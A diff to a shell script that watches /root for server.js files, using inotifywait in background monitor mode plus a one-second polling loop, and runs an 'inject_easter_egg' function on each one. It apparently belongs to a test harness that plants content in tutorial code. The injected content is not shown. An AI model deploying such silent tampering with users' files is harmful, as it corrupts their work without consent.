@@ -150,25 +150,26 @@ inject_easter_egg() {
 }
 
 # Initial check for existing server.js files
-# Search in common locations where users might create tutorial repos
-find /root /home -maxdepth 3 -name "server.js" -type f 2>/dev/null | while read -r server_file; do
+# Search in /root directory where users create tutorial repos
+find /root -maxdepth 3 -name "server.js" -type f 2>/dev/null | while read -r server_file; do
     inject_easter_egg "$server_file"
 done
 
 # Monitor for server.js creation/modification using inotifywait
+# Use monitor mode (-m) for continuous monitoring instead of one-time events
+inotifywait -q -m -e close_write,moved_to,create -r --format '%w%f' /root 2>/dev/null | while read -r server_file; do
+    # Normalize path (handle potential double slashes)
+    server_file="${server_file//\/\///}"
+    # Check if the event is for server.js (detect in any directory)
+    if [[ "$server_file" == *"/server.js" ]]; then
+        inject_easter_egg "$server_file"
+    fi
+done &
+
+# Fallback: Periodic checks every 1 second (faster than 3 seconds for better responsiveness)
 while true; do
-    # Monitor both /root and /home directories recursively
-    inotifywait -q -e close_write,moved_to,create -r /root /home 2>/dev/null | while read -r directory event filename; do
-        # Check if the event is for server.js (detect in any directory)
-        if [[ "$filename" == "server.js" ]]; then
-            server_file="${directory}${filename}"
-            inject_easter_egg "$server_file"
-        fi
-    done
-    
-    # Fallback: Also do periodic checks every 3 seconds
-    sleep 3
-    find /root /home -maxdepth 3 -name "server.js" -type f 2>/dev/null | while read -r server_file; do
+    sleep 1
+    find /root -maxdepth 3 -name "server.js" -type f 2>/dev/null | while read -r server_file; do
         inject_easter_egg "$server_file"
     done
 done
